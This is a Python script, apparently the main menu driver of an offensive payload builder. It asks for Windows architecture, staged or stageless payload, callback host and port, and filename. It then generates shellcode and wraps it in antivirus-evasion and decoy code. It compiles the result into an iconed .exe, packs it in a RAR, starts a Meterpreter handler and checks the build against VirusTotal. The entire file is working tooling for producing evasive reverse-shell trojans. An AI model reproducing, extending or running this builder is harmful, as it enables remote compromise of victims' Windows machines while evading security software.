from lib import evasion, body, compiler, compression, core, decoy, gen, metascript, encryption

TYPE = ""
ARCHITECTURE = ""
PAYLOAD = ""
LHOST = "LHOST="
LPORT = "LPORT="
FILENAME = ""
SHELLCODE = ""
BUFFNAME = core.VARNAME_CREATOR()
FINAL_CODE = ""
ICON = ""

core.BANNER()

MC_WHILE = True

try:

    while MC_WHILE:

        MC_VAR = ""

        core.MODULE_CHOICE()

        MC_VAR += core.CORE_INPUT()

        if MC_VAR == "1":

            WTC_WHILE = True

            while WTC_WHILE:

                TYPE = ""

                core.WINDOWS_TYPE_CHOICE()

                WTC_VAR = core.CORE_INPUT()

                if WTC_VAR == "1":

                    TYPE += "YES"

                    WAC_WHILE = True

                    while WAC_WHILE:

                        core.WINDOWS_ARCHITECTURE_CHOICE()

                        WAC_VAR = core.CORE_INPUT()

                        if WAC_VAR == "1":

                            ARCHITECTURE += "X86"

                            PC_WHILE = True

                            while PC_WHILE:

                                PAYLOAD = ""

                                core.X86_WINDOWS_STAGED_CHOICE()

                                PAYLOAD += core.CORE_INPUT()

                                if PAYLOAD == "0":
                                    PAYLOAD = ""
                                    PC_WHILE = False

                                else:

                                    LHOST_WHILE = True

                                    while LHOST_WHILE:

                                        LHOST = "LHOST="

                                        core.LHOST_CHOICE()

                                        LHOST += core.CORE_INPUT()

                                        if LHOST == "LHOST=0":
                                            LHOST = "LHOST="
                                            LHOST_WHILE = False

                                        else:

                                            LPORT_WHILE = True

                                            while LPORT_WHILE:

                                                LPORT = "LPORT="

                                                core.LPORT_CHOICE()

                                                LPORT += core.CORE_INPUT()

                                                if LPORT == "LPORT=0":
                                                    LPORT = "LPORT="
                                                    LPORT_WHILE = False

                                                else:

                                                    FILENAME_WHILE = True

                                                    while FILENAME_WHILE:

                                                        FILENAME = ""

                                                        core.FILENAME()

                                                        FILENAME += "output/" + core.CORE_INPUT() + ".exe"

                                                        if FILENAME == "output/0.exe":
                                                            FILENAME = ""
                                                            FILENAME_WHILE = False

                                                        else:
                                                            SHELLCODE += gen.SHELLCODE_GENERATION(ARCHITECTURE, PAYLOAD, LHOST, LPORT)

                                                            END_OFS = True

                                                            while END_OFS:
                                                                FINAL_CODE += body.MODEL()
                                                                FINAL_CODE += evasion.THE_GREAT_EVASION(FILENAME)
                                                                FINAL_CODE += decoy.FAKE_U()
                                                                FINAL_CODE += str(SHELLCODE)
                                                                FINAL_CODE += body.LOCAL_OR_REMOTE()

                                                                with open('source.c', 'w') as f:
                                                                    f.write(FINAL_CODE)

                                                                ICON += compiler.ADD_ICON()

                                                                compiler.AUTO_COMPILE(FILENAME, ARCHITECTURE, ICON)

                                                                compression.RAR(FILENAME)

                                                                metascript.RUN_METERPRETER_SCRIPT(ARCHITECTURE, TYPE, PAYLOAD, LHOST, LPORT)

                                                                core.VIRUSTOTAL()

                                                                core.EXIT_PROGRAM()

                        elif WAC_VAR == "2":

                            ARCHITECTURE += "X64"

                            PC_WHILE = True

                            while PC_WHILE:

                                PAYLOAD = ""

                                core.X64_WINDOWS_STAGED_CHOICE()

                                PAYLOAD += core.CORE_INPUT()

                                if PAYLOAD == "0":
                                    PAYLOAD = ""
                                    PC_WHILE = False

                                else:

                                    LHOST_WHILE = True

                                    while LHOST_WHILE:

                                        LHOST = "LHOST="

                                        core.LHOST_CHOICE()

                                        LHOST += core.CORE_INPUT()

                                        if LHOST == "LHOST=0":
                                            LHOST = "LHOST="
                                            LHOST_WHILE = False

                                        else:

                                            LPORT_WHILE = True

                                            while LPORT_WHILE:

                                                LPORT = "LPORT="

                                                core.LPORT_CHOICE()

                                                LPORT += core.CORE_INPUT()

                                                if LPORT == "LPORT=0":
                                                    LPORT = "LPORT="
                                                    LPORT_WHILE = False

                                                else:

                                                    FILENAME_WHILE = True

                                                    while FILENAME_WHILE:

                                                        FILENAME = ""

                                                        core.FILENAME()

                                                        FILENAME += "output/" + core.CORE_INPUT() + ".exe"

                                                        if FILENAME == "output/0.exe":
                                                            FILENAME = ""
                                                            FILENAME_WHILE = False

                                                        else:
                                                            SHELLCODE += gen.SHELLCODE_GENERATION(ARCHITECTURE, PAYLOAD, LHOST, LPORT)

                                                            END_OFS = True

                                                            while END_OFS:
                                                                FINAL_CODE += body.MODEL()
                                                                FINAL_CODE += str(SHELLCODE)
                                                                FINAL_CODE += evasion.THE_GREAT_EVASION(FILENAME)
                                                                FINAL_CODE += decoy.FAKE_U()
                                                                FINAL_CODE += body.LOCAL_OR_REMOTE()

                                                                with open('source.c', 'w') as f:
                                                                    f.write(FINAL_CODE)

                                                                ICON += compiler.ADD_ICON()

                                                                compiler.AUTO_COMPILE(FILENAME, ARCHITECTURE, ICON)

                                                                compression.RAR(FILENAME)

                                                                metascript.RUN_METERPRETER_SCRIPT(ARCHITECTURE, TYPE, PAYLOAD, LHOST, LPORT)

                                                                core.VIRUSTOTAL()

                                                                core.EXIT_PROGRAM()

                        elif WAC_VAR == "0":
                            WAC_WHILE = False

                        else:

                            core.BAD_CHOICE()

                elif WTC_VAR == "2":

                    TYPE += "NO"

                    WAC_WHILE = True

                    while WAC_WHILE:

                        core.WINDOWS_ARCHITECTURE_CHOICE()

                        WAC_VAR = core.CORE_INPUT()

                        if WAC_VAR == "1":

                            ARCHITECTURE += "X86"

                            PC_WHILE = True

                            while PC_WHILE:

                                PAYLOAD = ""

                                core.X86_WINDOWS_STAGELESS_CHOICE()

                                PAYLOAD += core.CORE_INPUT()

                                if PAYLOAD == "0":
                                    PAYLOAD = ""
                                    PC_WHILE = False

                                else:

                                    LHOST_WHILE = True

                                    while LHOST_WHILE:

                                        LHOST = "LHOST="

                                        core.LHOST_CHOICE()

                                        LHOST += core.CORE_INPUT()

                                        if LHOST == "LHOST=0":
                                            LHOST = "LHOST="
                                            LHOST_WHILE = False

                                        else:

                                            LPORT_WHILE = True

                                            while LPORT_WHILE:

                                                LPORT = "LPORT="

                                                core.LPORT_CHOICE()

                                                LPORT += core.CORE_INPUT()

                                                if LPORT == "LPORT=0":
                                                    LPORT = "LPORT="
                                                    LPORT_WHILE = False

                                                else:

                                                    FILENAME_WHILE = True

                                                    while FILENAME_WHILE:

                                                        FILENAME = ""

                                                        core.FILENAME()

                                                        FILENAME += "output/" + core.CORE_INPUT() + ".exe"

                                                        if FILENAME == "output/0.exe":
                                                            FILENAME = ""
                                                            FILENAME_WHILE = False

                                                        else:
                                                            SHELLCODE += gen.SHELLCODE_GENERATION(ARCHITECTURE, PAYLOAD, LHOST, LPORT)

                                                            END_OFS = True

                                                            while END_OFS:
                                                                FINAL_CODE += body.MODEL()
                                                                FINAL_CODE += str(SHELLCODE)
                                                                FINAL_CODE += evasion.THE_GREAT_EVASION(FILENAME)
                                                                FINAL_CODE += decoy.FAKE_U()
                                                                FINAL_CODE += body.LOCAL_OR_REMOTE()

                                                                with open('source.c', 'w') as f:
                                                                    f.write(FINAL_CODE)

                                                                ICON += compiler.ADD_ICON()

                                                                compiler.AUTO_COMPILE(FILENAME, ARCHITECTURE, ICON)

                                                                compression.RAR(FILENAME)

                                                                metascript.RUN_METERPRETER_SCRIPT(ARCHITECTURE, TYPE, PAYLOAD, LHOST, LPORT)

                                                                core.VIRUSTOTAL()

                                                                core.EXIT_PROGRAM()

                        elif WAC_VAR == "2":

                            ARCHITECTURE += "X64"

                            PC_WHILE = True

                            while PC_WHILE:

                                PAYLOAD = ""

                                core.X64_WINDOWS_STAGELESS_CHOICE()

                                PAYLOAD += core.CORE_INPUT()

                                if PAYLOAD == "0":
                                    PAYLOAD = ""
                                    PC_WHILE = False

                                else:

                                    LHOST_WHILE = True

                                    while LHOST_WHILE:

                                        LHOST = "LHOST="

                                        core.LHOST_CHOICE()

                                        LHOST += core.CORE_INPUT()

                                        if LHOST == "LHOST=0":
                                            LHOST = "LHOST="
                                            LHOST_WHILE = False

                                        else:

                                            LPORT_WHILE = True

                                            while LPORT_WHILE:

                                                LPORT = "LPORT="

                                                core.LPORT_CHOICE()

                                                LPORT += core.CORE_INPUT()

                                                if LPORT == "LPORT=0":
                                                    LPORT = "LPORT="
                                                    LPORT_WHILE = False

                                                else:

                                                    FILENAME_WHILE = True

                                                    while FILENAME_WHILE:

                                                        FILENAME = ""

                                                        core.FILENAME()

                                                        FILENAME += "output/" + core.CORE_INPUT() + ".exe"

                                                        if FILENAME == "output/0.exe":
                                                            FILENAME = ""
                                                            FILENAME_WHILE = False

                                                        else:
                                                            SHELLCODE += gen.SHELLCODE_GENERATION(ARCHITECTURE, PAYLOAD, LHOST, LPORT)

                                                            END_OFS = True

                                                            while END_OFS:
                                                                FINAL_CODE += body.MODEL()
                                                                FINAL_CODE += str(SHELLCODE)
                                                                FINAL_CODE += evasion.THE_GREAT_EVASION(FILENAME)
                                                                FINAL_CODE += decoy.FAKE_U()
                                                                FINAL_CODE += body.LOCAL_OR_REMOTE()

                                                                with open('source.c', 'w') as f:
                                                                    f.write(FINAL_CODE)

                                                                ICON += compiler.ADD_ICON()

                                                                compiler.AUTO_COMPILE(FILENAME, ARCHITECTURE, ICON)

                                                                compression.RAR(FILENAME)

                                                                metascript.RUN_METERPRETER_SCRIPT(ARCHITECTURE, TYPE, PAYLOAD, LHOST, LPORT)

                                                                core.VIRUSTOTAL()

                                                                core.EXIT_PROGRAM()

                        elif WAC_VAR == "0":

                            WAC_WHILE = False

                        else:

                            core.BAD_CHOICE()

                elif WTC_VAR == "0":

                    WTC_WHILE = False

                else:

                    core.BAD_CHOICE()

        elif MC_VAR == "0":

            core.EXIT_PROGRAM()

        else:

            core.BAD_CHOICE()

except KeyboardInterrupt:
    print("\n")
    exit(0)
